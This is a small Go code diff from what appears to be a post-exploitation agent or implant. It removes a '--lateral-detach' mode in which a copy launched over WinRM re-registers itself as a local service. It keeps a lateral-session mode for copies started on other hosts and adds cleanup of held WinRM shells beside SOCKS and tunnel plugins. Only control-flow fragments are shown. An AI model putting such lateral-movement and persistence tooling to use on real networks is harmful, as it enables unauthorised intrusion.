@@ -163,19 +163,6 @@ func main() {
 		debugEvent("process.exit.graceful", nil)
 		return
 	}
-	if len(os.Args) > 2 && os.Args[1] == "--lateral-detach" {
-		initAgentDebug(false)
-		defer closeAgentDebug()
-		// A WinRM shell started this copy inside its job object; it
-		// re-registers itself as a local service and exits immediately.
-		if err := runLateralDetach(os.Args[2:]); err != nil {
-			debugEvent("lateral.detach.failed", err)
-			fmt.Fprintln(os.Stderr, err)
-			os.Exit(3)
-		}
-		debugEvent("process.exit.graceful", nil)
-		return
-	}
 	if len(os.Args) > 1 && os.Args[1] == "--lateral-session" {
 		// A lateral move started this copy on another host; the target must
 		// register under its own identity instead of the embedded default.
@@ -228,6 +215,7 @@ func runAgentLoop(ctx context.Context) {
 	defer socksPlugin.stop()
 	defer tunPlugin.stop()
 	defer stopPlatformWorkers()
+	defer stopHeldWinRMShells()
 
 	for ctx.Err() == nil {
 		if identityBoundaryFault.Load() {
